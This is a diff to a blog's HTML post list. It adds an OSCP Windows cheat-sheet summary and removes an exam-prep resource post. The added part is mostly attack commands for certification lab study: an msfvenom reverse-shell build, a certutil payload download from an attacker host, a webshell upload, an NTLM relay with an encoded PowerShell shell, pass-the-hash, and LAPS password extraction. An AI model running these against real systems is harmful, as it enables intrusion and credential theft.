@@ -150,6 +150,83 @@
     
       <article class="post on-list">
         <h2 class="post-title">
+          <a href="/posts/oscp---cheat-sheet---windows/">OSCP - Cheat Sheet - Windows</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/oscp/">oscp</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="quick-reference">Quick Reference</h1>
+<ul>
+<li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
+<li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
+<li><code>dir /s/b *.txt</code></li>
+<li>RDP: <code>xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore</code></li>
+<li>RevShell.exe: <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe</code></li>
+<li>Compile C: <code>/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe</code></li>
+<li>Compile C#: <code>msbuild projectname.csproj</code></li>
+<li>Transfer to Windows host: <code>certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe</code></li>
+<li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
+<li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
+</ul>
+<h1 id="port-enumeration-from-kali">Port Enumeration (from Kali)</h1>
+<ul>
+<li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
+<ul>
+<li>Run <code>put /usr/share/webshells/aspx/cmdasp.aspx</code> to upload command shell, then access via browser</li>
+</ul>
+</li>
+<li><strong>Kerberos (88)</strong>: <code>kerbrute userenum -d domain.name --dc 192.168. users</code></li>
+<li><strong>SMB (139/445)</strong>: <code>sudo nmap --script smb-vuln* -p 139,445 192.168.</code>
+<ul>
+<li><code>smbclient -U user \\\\192.168.</code></li>
+<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code> (base64 powershell one-liner)
+<ul>
+<li>Kali: Call fake directory <code>dir \\192.168.xx.xxx\fake</code> for reverse shell</li>
+</ul>
+</li>
+<li>Pass the Hash: <code>smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></li>
+</ul>
+</li>
+<li><strong>LDAP (389)</strong>: <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.</code>
+<ul>
+<li>Domain Name found (LDAP Search): <code>ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'</code></li>
+<li>Use credentials to find admin password <code>ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code>
+<ul>
+<li>To Login <code>psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x</code> to login</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="impacket">Impacket</h1>
+<p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
+<code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---windows/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
           <a href="/posts/oscp---clue---linux/">OSCP - Clue - Linux</a>
         </h2>
         <div class="post-meta"></div>
@@ -293,65 +370,6 @@
         
            <div>
             <a class="read-more button inline" href="/posts/oscp---crane---linux/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/oscp---exam-prep/">OSCP - Exam Prep</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p>ProvingGrounds (very close to OSCP)</p>
-<ul>
-<li><strong>PG Practice</strong>: Structured, guided learning with focused challenges to teach specific skills.</li>
-<li><strong>PG Play</strong>: Open, unguided labs that simulate real-world penetration testing <em>(best for OSCP prep)</em></li>
-</ul>
-<p>OffSec Challenge labs</p>
-<ul>
-<li>Challenge 0-2: Good warmup</li>
-<li>Challenge 3: Beyond scope of exam</li>
-<li><strong>Challenge 4-6</strong>: <em>OSCP-like experience</em>
-<ul>
-<li>Give yourself 24hrs for each</li>
-</ul>
-</li>
-</ul>
-<p>TjNull&rsquo;s List (excellent)</p>
-<ul>
-<li><a href="https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf">Ipsec videos</a></li>
-<li><a href="https://www.youtube.com/playlist?list=PLcSbj5mz-wxPK8KD522vH5Gny4bSemX2H">NoxLumens Walkthroughs</a></li>
-</ul>
-<p>HTB Academy - CPTS</p>
-<ul>
-<li>Active Directory &amp; Enumeration</li>
-<li>Pivoting and tunnelling</li>
-<li>Attacking Common Services</li>
-<li>PrivEsc - Windows &amp; Linux</li>
-<li>File Transfer</li>
-</ul>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---exam-prep/">[Read more]</a>
           </div>
         
       </article>
